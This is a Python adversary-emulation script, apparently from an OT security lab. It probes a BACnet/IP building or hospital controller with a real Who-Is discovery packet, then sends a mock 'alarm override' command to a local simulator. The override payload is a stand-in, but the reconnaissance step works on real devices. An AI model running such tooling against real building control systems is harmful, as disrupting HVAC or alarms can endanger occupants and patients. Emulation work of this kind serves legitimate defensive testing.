#!/usr/bin/env python3
"""attacker/attack_bacnet.py — Script de emulación adversaria BACnet/IP (Categoría B OT)

Simula inyección de comandos BACnet/IP UDP (Who-Is / Alarm override) contra el PLC hospitalario/edificio.
"""

from __future__ import annotations

import socket
from typing import Dict, Any


class BacnetAttacker:
    """Emulador de ataque BACnet/IP sobre UDP 47808."""

    def __init__(self, target_host: str = '127.0.0.1', target_port: int = 47808) -> None:
        self.target_host = target_host
        self.target_port = target_port

    def send_whois(self) -> Dict[str, Any]:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2.0)
        bvlc_whois = bytearray([0x81, 0x0b, 0x00, 0x0c, 0x01, 0x00, 0x10, 0x08])
        try:
            s.sendto(bytes(bvlc_whois), (self.target_host, self.target_port))
            resp, _ = s.recvfrom(1024)
            s.close()
            return {'status': 'SUCCESS', 'raw_hex': resp.hex(), 'bvlc': bool(resp and resp[0] == 0x81)}
        except Exception as exc:
            s.close()
            return {'status': 'FAILED', 'error': str(exc)}

    def inject_alarm_override(self) -> Dict[str, Any]:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2.0)
        cmd = b'OVERRIDE BACNET HVAC ALARM\n'
        try:
            s.sendto(cmd, (self.target_host, self.target_port))
            resp, _ = s.recvfrom(1024)
            s.close()
            text = resp.decode('utf-8', errors='replace')
            return {'status': 'SUCCESS', 'response': text, 'alarm_set': 'STATUS=ALARM' in text}
        except Exception as exc:
            s.close()
            return {'status': 'FAILED', 'error': str(exc)}


def main() -> None:
    attacker = BacnetAttacker()
    res1 = attacker.send_whois()
    print('[*] BACnet Who-Is Result:', res1)
    res2 = attacker.inject_alarm_override()
    print('[*] BACnet Alarm Injected:', res2)


if __name__ == '__main__':
    main()
